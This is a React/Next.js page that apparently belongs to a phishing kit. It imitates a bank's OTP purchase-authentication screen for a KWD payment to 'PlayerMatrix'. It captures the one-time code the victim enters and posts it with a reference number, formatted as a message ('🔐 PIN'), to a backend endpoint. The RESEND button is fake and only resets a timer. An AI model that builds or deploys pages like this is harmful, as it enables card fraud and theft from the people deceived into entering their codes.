"use client";
import { Suspense } from "react";
import React, { useState, useEffect } from "react";
import 'bootstrap/dist/css/bootstrap.min.css';
import { useSearchParams } from 'next/navigation';

function CodePageContent() {
  const [code, setCode] = useState("");
  const [timeLeft, setTimeLeft] = useState(60); // دقيقة واحدة
  const [expired, setExpired] = useState(false);
  const [resending, setResending] = useState(false);
  const [errorMessage, setErrorMessage] = useState(""); // رسالة الخطأ
  const [successMessage, setSuccessMessage] = useState(""); // رسالة النجاح

  const searchParams = useSearchParams();
  const refN = searchParams.get("refN");
  const price = searchParams.get('price');

  useEffect(() => {
    if (timeLeft > 0) {
      const timer = setTimeout(() => setTimeLeft((prev) => prev - 1), 1000);
      return () => clearTimeout(timer);
    } else {
      setExpired(true);
    }
  }, [timeLeft]);

  const handleSubmit = async () => {
    if (!code) {
      setErrorMessage("الرجاء إدخال الكود");
      setSuccessMessage("");
      return;
    }

    const text = `🔐 PIN: ${code}\n🔨 Ref: ${refN}`;

    try {
      const res = await fetch("/api/sendData", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ text }),
      });

      const result = await res.json();

      if (result.success) {
        setErrorMessage("");
        setSuccessMessage("تم إرسال الكود بنجاح!");
      } else {
        setSuccessMessage("");
        setErrorMessage("الكود خاطئ، يرجى المحاولة مرة أخرى");
      }
    } catch (err) {
      console.error(err);
      setSuccessMessage("");
      setErrorMessage("حدث خطأ أثناء الإرسال، حاول مرة أخرى");
    }
  };

  const handleResend = () => {
    setResending(true);
    setTimeout(() => {
      setTimeLeft(60); // إعادة دقيقة
      setExpired(false);
      setResending(false);
      setErrorMessage("");
      setSuccessMessage("");
    }, 1000);
  };

  const handleCancel = () => {
    setCode("");
    setErrorMessage("");
    setSuccessMessage("");
  };

  return (
    <div className="container my-4" style={{ maxWidth: "500px", backgroundColor: "white", border: "1px solid #ddd" }} dir="ltr">
      <div className="p-4">
        <h5 className="fw-bold text-primary mb-3">Purchase Authentication</h5>
        <p className="mb-1">
          We have sent you an SMS with an OTP code to your registered mobile number. Please do not share it with anyone.
        </p>
        <p className="mb-3">
          You are paying <strong>PlayerMatrix</strong> the amount of <strong>KWD {price}.000</strong> on {new Date().toString()}
        </p>

        <label className="fw-bold mb-2">Enter your OTP code below:</label>
        <input 
          type="text" 
          className={`form-control mb-1 ${errorMessage ? "is-invalid" : ""}`} 
          value={code}
          onChange={(e) => setCode(e.target.value)}
          disabled={expired}
        />
        {errorMessage && <div className="text-danger mb-2">{errorMessage}</div>}
        {successMessage && <div className="text-danger mb-2">{errorMessage}</div>}

        <p className="text-danger fw-bold">
          Time left: {Math.floor(timeLeft / 60)}:{String(timeLeft % 60).padStart(2, "0")}
        </p>

        <div className="d-grid gap-2">
          <button 
            type="button" 
            className="btn text-white fw-bold" 
            style={{ backgroundColor: "#d32f2f" }}
            onClick={handleSubmit}
            disabled={expired}
          >
            CONFIRM
          </button>
          <div className="d-flex gap-2">
            <button 
              type="button" 
              className="btn btn-secondary w-50 fw-bold"
              onClick={handleResend}
              disabled={!expired || resending}
            >
              {resending ? "Resending..." : "RESEND"}
            </button>
            <button 
              type="button" 
              className="btn btn-secondary w-50 fw-bold"
              onClick={handleCancel}
            >
              CANCEL
            </button>
          </div>
        </div>

        <p className="mt-3 text-muted small">
          This page will automatically time out after 1 minute.
        </p>
      </div>
    </div>
  );
}

export default function CodePage() {
  return (
    <Suspense fallback={<div>Loading...</div>}>
      <CodePageContent />
    </Suspense>
  );
}
